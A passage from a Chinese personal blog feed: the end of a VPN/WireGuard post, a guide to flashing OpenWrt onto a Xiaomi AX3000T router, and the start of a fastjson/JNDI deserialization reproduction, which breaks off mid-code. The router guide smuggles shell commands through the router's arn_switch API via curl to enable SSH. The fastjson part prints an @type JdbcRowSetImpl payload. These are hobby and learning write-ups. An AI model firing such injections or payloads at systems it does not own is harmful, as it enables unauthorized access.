title="虚拟局域网与 VPN"></a>虚拟局域网与 VPN</h3><p><strong>虚拟局域网</strong>即 VLAN，是在<u>数据链路层上</u>对一个<u>物理网络</u>进行逻辑划分的技术，它使得在物理上处于不同位置的设备可以被划归到同一个逻辑局域网中。（但我发现似乎这个严格来讲是在局域网本身上实现的，而非我之前以为的那样，所以前面内容需部分更正。）</p><p>那么虚拟局域网与本篇通过 VPN 实现的效果有什么区别？<strong>VPN</strong>：通过加密隧道在公共网络上连接远程设备或网络，形成一个<u>逻辑上</u>的“私有网络”，设备可以跨越不同物理位置通信；<strong>VLAN</strong>：在<u>局域网内</u>通过<u>交换机</u>配置<u>逻辑隔离</u>的<u>广播域</u>，用于<u>分割本地网络流量</u>，不涉及加密或远程连接。</p><h3 id="端口映射、端口转发与内网穿透和代理"><a href="#端口映射、端口转发与内网穿透和代理" class="headerlink" title="端口映射、端口转发与内网穿透和代理"></a>端口映射、端口转发与内网穿透和代理</h3><p><strong>端口映射、端口转发</strong>实现功能类似，技术本质上也没有什么区别，都是通过 NAT 表，将路由器上指定端口的流量转发到内部的指定 IP 的指定端口，只是说端口映射强调的是将内网设备的端口公开到路由器所在的外部网络，端口转发强调的是将外部访问的数据转发到内部设备。</p><p>与内网穿透不同的是这个是直接在路由器上配置规则的，这个也可以实现内网穿透的效果。</p><p>另外它们帮助代理的实现。</p><h3 id="内网穿透与VPN"><a href="#内网穿透与VPN" class="headerlink" title="内网穿透与VPN"></a>内网穿透与VPN</h3><p>讲来讲去前面我尝试的全是VPN。这两者的区别感觉可以这样形容，内网穿透是把某个内网设备暴露到外部网络以供访问，VPN是把外部设备并入内部网络，通过VPN外部设备可以访问内网的所有网络服务。</p><h2 id="非对称密码与对称密码"><a href="#非对称密码与对称密码" class="headerlink" title="非对称密码与对称密码"></a>非对称密码与对称密码</h2><p>配置 WireGuard 时出现了两组密钥，容易搞混，借此记录一下</p><p>对称密码的优势在于加解密相对快速，硬件要求相对较低，但无法解决身份认证问题，密钥不能在公开信道传输。</p><p>而非对称密码损失了一些加解密效率但解决了身份认证问题，私钥本地保存公钥向外发放，公钥加密私钥解密。</p><p>在客户端与服务器通信的场景中，客户端保存私钥并将公钥传输给服务器，这样就确保了服务器发送的数据只有这个客户端能解密，即便公钥被他人获取。在数字签名的场景中，就是客户端保留公钥，向服务端发送私钥，那么就只有该客户端可以正确地加密内容并传输给服务器认证。</p><p>那么在 WireGuard 隧道中就是节点 A 与节点 B 间各自保存自己的私钥和对方的公钥，确保 A 发出的数据只有 B 能解密，B 发出的数据只有 A 能解密从而确保安全性。</p><h2 id="利用-DDNS-的改进"><a href="#利用-DDNS-的改进" class="headerlink" title="利用 DDNS 的改进"></a>利用 DDNS 的改进</h2><p>前面的实现的方案有一个不太方便的问题，就是 IP 是动态变化的（我尝试过设置静态 IP 但原本的租用期满后就无法正常上网了，看来只能接受学校的 DHCP，不过生活区某次断网后发现租期从三天变成了六天），隔段时间就要改一下手机端上 WireGuard 配置的对端 IP。于是我重新考虑 DDNS 到底能不能用（之前以为就是要公网 IP 的来着），发现至少阿里云的域名解析是可以解析成内网 IP 的，后续另起一篇看看能不能 DDNS 吧。</p><h2 id="坏消息"><a href="#坏消息" class="headerlink" title="坏消息"></a>坏消息</h2><p>这个方案出现了问题，串流成功后过一会后连接会异常中断，后续再排查问题吧，另起一篇。累</p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
      <tag>openwrt</tag>
      
      <tag>WireGuard</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小米 AX3000T 刷机 openwrt 小记</title>
    <link href="/2025/04/21/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/04/21/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="小米-AX3000T-刷机-openwrt-小记"><a href="#小米-AX3000T-刷机-openwrt-小记" class="headerlink" title="小米 AX3000T 刷机 openwrt 小记"></a>小米 AX3000T 刷机 openwrt 小记</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这两天在思考如何在寝室局域网之外远程连接寝室设备，以满足我有时候出门不方便带电脑想要用手机远程连接电脑操作的需求。我选定的是 sunshine+moonlight 串流方案，然而该方案本身并不支持远程连接，只适用于局域网连接，所以我需要通过内网穿透或 VPN 构建虚拟局域网来让我的电脑和手机设备处于同一个局域网环境内。先尝试了云服务器之前搭建好的 openVPN 服务，发现限于带宽和性能，连接质量并不理想，于是我想尝试在寝室路由器上使用 wireguard 构建隧道实现内网穿透。</p><p>好了，不管怎么说，原厂的可操作性太差了，先刷个 openwrt 耍耍 0v0</p><h1 id="设备型号"><a href="#设备型号" class="headerlink" title="设备型号"></a>设备型号</h1><p>路由器型号：小米 AX3000T</p><p>系统 ROM 版本：1.0.98？（好像是 9 几，忘了）</p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><h2 id="启用-SSH"><a href="#启用-SSH" class="headerlink" title="启用 SSH"></a>启用 SSH</h2><h3 id="固件降级"><a href="#固件降级" class="headerlink" title="固件降级"></a>固件降级</h3><p>为了能够通过 ssh 连接路由器设备控制并操作，需要先降低 ROM 版本换成易于攻击的 1.0.47 版本，从而启用 ssh。</p><p>1.0.47 固件链接：<a href="https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rd03/miwifi_rd03_firmware_ef0ee_1.0.47.bin">小米官方 CDN</a></p><p>小米官方刷机工具：<a href="https://www1.miwifi.com/miwifi_download.html">https://www1.miwifi.com/miwifi_download.html</a></p><p>下载编译好的固件后先打开刷机工具，用网线连接电脑和路由器 lan 口，选择要上传的文件的路径，点击下一步</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/JsDKbvdoVomz1bxsbYscOWv4nab.png"></p><p>选择网卡，需要区分 VMware 设备的虚拟网卡等其他网卡，必要的时候可以暂时禁用其他网卡，必须选择物理网卡，一般名称带有“以太网”。而后点击下一步</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/MSVEbD2NHoTV7ExS90EcsFZVnpb.png"></p><p>根据提示先给路由器断电，找一根卡针或者牙签按住路由器上的 reset 键，然后接通电源，等到橙色灯闪烁之后再松开 reset 键。一开始下方会出现“可以开始刷机操作”的提示，路由器橙色灯闪烁，然后路由器发送请求，电脑返回文件，工具自动刷入 ROM，完成之后变蓝灯闪烁，刷机成功，断电重启路由器。</p><p>我遇到的问题是路由器的请求迟迟没有出现，指示灯一直在橙灯长亮、橙灯闪烁之间循环，后来发现需要先暂时关闭 windows 的防火墙，否则电脑不会接收路由器的请求。</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/BcSQb7k5So2YtSx0i04cCuH4nrc.png"></p><h3 id="修改路由器配置启用-ssh"><a href="#修改路由器配置启用-ssh" class="headerlink" title="修改路由器配置启用 ssh"></a>修改路由器配置启用 ssh</h3><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/Zxk4bIl24oM7mJx1XA1c0zKBnye.png"></p><p>需使用 cmd 依次执行以下命令，<code>&lt;stok&gt;</code> 处填入访问路由器管理页面的 <code>stok</code> 字段内容，使用 PowerShell 解析参数错误会报错。每次都要返回 <code>&#123;&quot;code&quot;:0&#125;</code> 才算成功。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0Anvram%20set%20ssh_en%3D1%0A&quot;</span><br>curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0Anvram%20commit%0A&quot;</span><br>curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0Ased%20-i%20&#x27;s%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg&#x27;%20%2Fetc%2Finit.d%2Fdropbear%0A&quot;</span><br>curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A&quot;</span><br></code></pre></td></tr></table></figure><h3 id="ssh-登入"><a href="#ssh-登入" class="headerlink" title="ssh 登入"></a>ssh 登入</h3><p>而后尝试直接 ssh 登录，报错，需要用 ssh-rsa 协商</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/VuDJbZgDfosQQOxjhBhcfWZenqb.png"></p><p>改用如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.31.1<br></code></pre></td></tr></table></figure><p>登录密码需要用路由管理界面 SN 的全部内容放到 <a href="https://miwifi.dev/ssh">https://miwifi.dev/ssh</a> 处理获取，注意 Ctrl+v 无法使用，右键粘贴</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/WqFGbsLi1oqKktxWV99cESHVnOh.png"></p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/MsNabZPz6o2VSSx54wecGYHnnDe.png"></p><h2 id="刷入-U-Boot"><a href="#刷入-U-Boot" class="headerlink" title="刷入 U-Boot"></a>刷入 U-Boot</h2><p>U-Boot 全称 Universal Boot Loader，是一个开源的引导加载程序，广泛应用于嵌入式系统中。它的主要作用是在系统启动时初始化硬件设备，建立内存空间的映射图，加载操作系统内核到内存中并执行，为操作系统的启动提供必要的准备。</p><h3 id="备份原固件"><a href="#备份原固件" class="headerlink" title="备份原固件"></a>备份原固件</h3><p>为了避免后续出现意外导致难以修复，先备份固件以防万一。<code>cat /proc/mtd</code> 查看所有分区</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/OKGzbOTXsoNZllxPVNMc3lMrnpc.png"></p><p>然后使用如下命令依次打包 1~12 共 12 个分区</p><div class="note note-warning">            <p><strong>注意：</strong></p><p>请不要偷懒想要一次性完成下面所有操作，由于路由器的 ROM 通常较小，一次性大量的备份操作会让 ROM “爆掉”，最好每一个都单独备份，且备份完成后就下载并删除。这是来自 zkz098 的提醒。</p><p>其中 mtd0 似乎是众多分区的汇总，无需重复备份，而我在好奇心的驱使下尝试在完成其他所有分区的备份后对其进行备份，导致路由器崩溃重启……</p><p>那么上述问题一般而言的应对方法是：重启路由器后重复“修改路由器配置启用 ssh”到“ssh 登录”步骤</p>          </div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd1 of=/tmp/BL2.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd2 of=/tmp/Nvram.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd3 of=/tmp/Bdate.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd4 of=/tmp/Factory.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd5 of=/tmp/FIP.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd6 of=/tmp/crash.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd7 of=/tmp/crash_log.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd8 of=/tmp/ubi.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd9 of=/tmp/ubi1.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd10 of=/tmp/overlay.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd11 of=/tmp/date.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd12 of=/tmp/KF.bin<br></code></pre></td></tr></table></figure><p>单句执行效果如下</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/VIsgbXhqlogbaNxWxO1cX18snUg.png"></p><p>随后将打包好的 bin 文件传回电脑保存，路由器原本自带 netcat 但功能不完整，不好用，所以为了方便起见使用 WinSCP 对文件进行传输管理。</p><p>使用 WinSCP 建立连接，注意协议需选择 SCP，其他无法连接，密码即之前获取的密码。</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/Zba8brDVDoiCuzxNqlDcO0r7nEg.png"></p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/WfW4bONy7oDyaJxmsR1ctn3ynls.png"></p><p>而后发生的就是我把路由器玩崩了，重新 ssh 登录时提示 SHA256 认证信息改变，该设备不受信任</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/WhJVb6SmTob9WwxVvwPcJfQ2nxe.png"></p><p>这是因为之前连接的时候保存了指纹信息，现在对不上了，用 <code>ssh-keygen -R 192.168.31.1</code> 清除原本保存着的 192.168.31.1 相关指纹即可。</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/HqXBbUnoJoOF9TxGUVccZA5Mntb.png"></p><h3 id="刷入-U-Boot-固件"><a href="#刷入-U-Boot-固件" class="headerlink" title="刷入 U-Boot 固件"></a>刷入 U-Boot 固件</h3><p><strong>确保备份完成后</strong>，用 WinSCP 把固件文件传输到路由器上，执行以下命令将固件写入 FIP 分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtd write mt7981_ax3000t-fip-fixed-parts-multi-layout.bin FIP<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/V71ubshtDoNGQAxpnBBc4DvFnbf.png"></p><p>这步结束即完成了 U-Boot 固件的刷入</p><h2 id="刷入-openwrt"><a href="#刷入-openwrt" class="headerlink" title="刷入 openwrt"></a>刷入 openwrt</h2><p>接下来要用 U-Boot 加载 openwrt 的固件刷入</p><h3 id="配置网络连接"><a href="#配置网络连接" class="headerlink" title="配置网络连接"></a>配置网络连接</h3><p>目前网线仍然连接着电脑与路由器，由于 uboot 不具备 DHCP 能力，所以需要手动配置一下网卡来访问 uboot 的界面</p><p>将 IP 分配模式设为手动，选一个不会冲突的 IPv4 地址，掩码、网关如下，DNS 服务器选择国内能用的且不建议加密</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/GYCPbgH4VoFirSxHqgec5zzOnsc.png"></p><h3 id="刷入-openwrt-固件"><a href="#刷入-openwrt-固件" class="headerlink" title="刷入 openwrt 固件"></a>刷入 openwrt 固件</h3><p>访问 192.168.1.1 的 U-Boot 页面，选择要上传的本地的 openwrt 固件，并选择相应的 <code>mtd layout</code>（QWRT 选 QWRT，immortalwrt 选 immortalwrt-w112，这里我选择的固件是 QWRT），而后点击 Upload。</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/EATQbRa6HokI28xlenxctdQanPd.png"></p><p>上传完成后再点击 Update，在这个过程中路由器会变为橙灯，随后橙灯快速闪烁，再变为蓝灯，此时刷入成功。</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/G8bsbfzEgoUhXlxL4XQcBAVgnDg.png"></p><p>如果观察到路由器的橙灯慢速闪烁 (约 5 秒一次)，此时请等待半分钟，如果仍然保持此状态，可以按照前文重新进入 UBoot 了。这个闪烁意味着固件刷入失败，UBoot 会提示 UPDATE FAILED，建议更换固件并选择正确的 mtd layout 后重试</p><h2 id="登录-openwrt"><a href="#登录-openwrt" class="headerlink" title="登录 openwrt"></a>登录 openwrt</h2><p>QWRT 的默认管理页面地址为 192.168.1.1，默认管理员账号密码 <code>root</code>、<code>password</code></p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/Sf8EbAJejoFXMXxsEANcuxDhn1W.png"></p><p>完成，帅~</p><h1 id="如何刷回原厂？"><a href="#如何刷回原厂？" class="headerlink" title="如何刷回原厂？"></a>如何刷回原厂？</h1><p>来自 zkz098 的实践经验：</p><blockquote><p>先恢复原厂 UBoot 后使用小米救砖工具刷入固件<br>找到前文的备份文件中的 <code>FIP.bin</code> ，使用 SSH 工具上传到 &#x2F;tmp 目录下，随后：<code>mtd write FIP.bin FIP</code> 等待命令完成 (15-30 秒左右) 后断电重启，此时按照前文的降级方法刷入原厂 1.0.47 固件 (可能需要多次刷入)<br>如果刷入成功，橙灯会常亮一会，然后橙灯闪烁，此时可以按照正常新路由器的方法，连接到无密码默认 SSID 中进入开始使用</p></blockquote><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>zkz098 的文章，所需固件可以从下方文章中获取，或者网上寻找，或者自行编译，这篇是主要参考，很详细：</p><p><a href="https://www.kaitaku.xyz/misc/ax3000t-openwrt/">https://www.kaitaku.xyz/misc/ax3000t-openwrt/</a></p><p>固件降级示范：</p><p><a href="https://www.bilibili.com/video/BV1jZ421875V/?vd_source=ae44e9df2e6bb265e83888153930e885">https://www.bilibili.com/video/BV1jZ421875V/?vd_source&#x3D;ae44e9df2e6bb265e83888153930e885</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
      <tag>openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson+jndi 漏洞复现及 HgameFinal 某题复现</title>
    <link href="/2025/04/14/fastjson+jndi%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8AHgameFinal%E6%9F%90%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/14/fastjson+jndi%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8AHgameFinal%E6%9F%90%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="fastjson-jndi-漏洞复现及-HgameFinal-某题复现"><a href="#fastjson-jndi-漏洞复现及-HgameFinal-某题复现" class="headerlink" title="fastjson+jndi 漏洞复现及 HgameFinal 某题复现"></a>fastjson+jndi 漏洞复现及 HgameFinal 某题复现</h1><h1 id="阅前声明"><a href="#阅前声明" class="headerlink" title="阅前声明"></a>阅前声明</h1><p>本篇内容涉及 fastjson 反序列化漏洞（主要 1.2.47）、jndi 注入漏洞（主要 com.sun.rowset.JdbcRowSetImpl 用 ldap 返回 Reference 加载远程类方式）、HgameFinal2025-ezjson 复现（fastjson1.2.47+JdbcRowSetImpl 用 ldap 返回数据流 +Jackson 原生反序列化）。此外还包括部分 jdk 版本、依赖版本的各种绕过方式，但由于篇幅有限不宜过多，所以除了切实实践过的内容外主要列举我所学习到的文章。</p><p>本篇目的在于记录学习过程学习成果、方便回顾、快速查询资料，参考了大量文章，所以有许多的文章链接、引用（文章内容可能部分有重复），且基本标注了各篇文章我认为帮助了我理解的内容或其长处。同时，由于初学，内容偏基础，经过多次改动修正。</p><h1 id="漏洞复现环境配置注意事项"><a href="#漏洞复现环境配置注意事项" class="headerlink" title="漏洞复现环境配置注意事项"></a>漏洞复现环境配置注意事项</h1><p>为了方便漏洞复现，使用的 jdk 版本要 1.8，且小于等于 oracle 8u191，我这次使用的是 oracle 8u181，官网下载需要注册账户，可以选择华为镜像源下载。一定要注意 jdk 版本，否则无法顺利执行命令。下面的原理分析及攻击实现流程分析均针对 oracle 8u181，fastjson1.2.47。</p><p><a href="https://blog.csdn.net/qq_43362426/article/details/111370493">idea 更换 jdk 版本修改位置</a></p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="fastjson-功能、序列化反序列化"><a href="#fastjson-功能、序列化反序列化" class="headerlink" title="fastjson 功能、序列化反序列化"></a>fastjson 功能、序列化反序列化</h2><p>即将 JavaBean 转为 json 字符串或解析 json 转为 JavaBean，即序列化与反序列化的操作</p><p>关于 java 的序列化反序列化是什么样子、原生序列化方式和 fastjson 序列化方式的区别可以参照<a href="https://www.freebuf.com/articles/web/369926.html">这篇</a>前半部分看一看</p><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>个人认为 fastjson 反序列化漏洞主要暴露的风险是：攻击者可以通过这个漏洞实现部分 java 类、实例等的操控，而后就是利用例如 JdbcRowSetImpl、TemplatesImpl 进行 JNDI 注入。</p><p>也就是说个人感觉要比较全面地分析攻击的实现需要分为两部分：一个就是 fastjson 反序列化漏洞本身是如何产生的、不同的安全检测是如何绕过的；另一个就是 fastjson 反序列化漏洞可以利用后，可以结合其他哪些漏洞 RCE、这些漏洞或特性是如何产生如何利用的，该如何寻找这些可利用的漏洞或特性或类（感觉我完全不具备这个能力，阿巴阿巴.jpg，日后继续努力）。</p><p>那么 fastjson 漏洞是怎么产生的呢，主要是 @type 属性可以在 JSON 字符串中指定反序列化时应该实例化的具体类，而相应的安全检测、补丁（<code>checkAutoType()</code>）存在缺陷，致使攻击者可以指定一些可执行命令或进行其他恶意操作的危险类反序列化。</p><h2 id="fastjson-的-checkAutoType-源码分析"><a href="#fastjson-的-checkAutoType-源码分析" class="headerlink" title="fastjson 的 checkAutoType()源码分析"></a>fastjson 的 checkAutoType()源码分析</h2><p>简单写一个服务，导入 fastjson1.2.47 包，使用 fastjson 的方法进行调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br> <br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">mainController</span> &#123;<br><br>    <span class="hljs-meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseJson</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String json)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON._parseObject_(json);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Parsed: &quot;</span> + obj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发包 json 参数让目标反序列化处理</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;<br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-48e63e18" role="button" aria-expanded="false" aria-controls="collapse-48e63e18">        <div class="fold-arrow">▶</div>此部分可略过，使用ctrl+N直接查找checkAutoType()      </div>      <div class="fold-collapse collapse" id="collapse-48e63e18">        <div class="fold-content">          <p>使用 fastjson 的 <code>parseobject()</code> 后在 JSON.class 调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> _parse_(text);        <span class="hljs-comment">//步入该句parse</span><br>    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>        <span class="hljs-keyword">return</span> (JSONObject)obj;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> (JSONObject)_toJSON_(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var3) &#123;<br>            <span class="hljs-type">RuntimeException</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var3;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;can not cast to JSONObject.&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>步入 <code>parse(text)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-keyword">return</span> _parse_(text, _DEFAULT_PARSER_FEATURE_);  <span class="hljs-comment">//步入该句parse</span><br>&#125;<br></code></pre></td></tr></table></figure><p>继续步入 <code>parse(text,  _DEFAULT_PARSER_FEATURE_ )</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-keyword">return</span> _parse_(text, ParserConfig._getGlobalInstance_(), features);    <span class="hljs-comment">//步入该句parse</span><br>&#125;<br></code></pre></td></tr></table></figure><p>继续步入，选中 <code>parse</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(String text, ParserConfig config, <span class="hljs-type">int</span> features)</span> &#123;<br>    <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span 